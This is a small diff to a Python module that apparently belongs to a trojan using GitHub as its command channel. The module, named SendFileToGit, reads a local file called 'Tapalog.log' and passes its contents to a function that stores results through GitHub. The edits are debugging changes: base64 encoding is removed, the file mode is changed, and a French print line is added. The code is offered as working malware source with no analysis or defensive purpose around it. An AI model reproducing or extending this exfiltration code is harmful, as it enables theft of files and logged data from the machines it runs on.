@@ -4,7 +4,7 @@ import base64
 import os
 
 path = "others/"
-filePath = base64.b64encode("Tapalog.log")
+filePath = "Tapalog.log"#base64.b64encode("Tapalog.log")
 TargetOSfilePath = "Tapalog.log"
 
 def connect_to_github():
@@ -21,9 +21,10 @@ def store_module_result(data):
 
 def run(**args):
 	try:
-		fich = open(TargetOSfilePath, "rb")
+		fich = open(TargetOSfilePath, "r")
 		content = fich.read()
 		fich.close()
+		print("Je suis SendFile...")
 		store_module_result(content)
 		return "SendFileToGit: Successfully sent"
 	except:
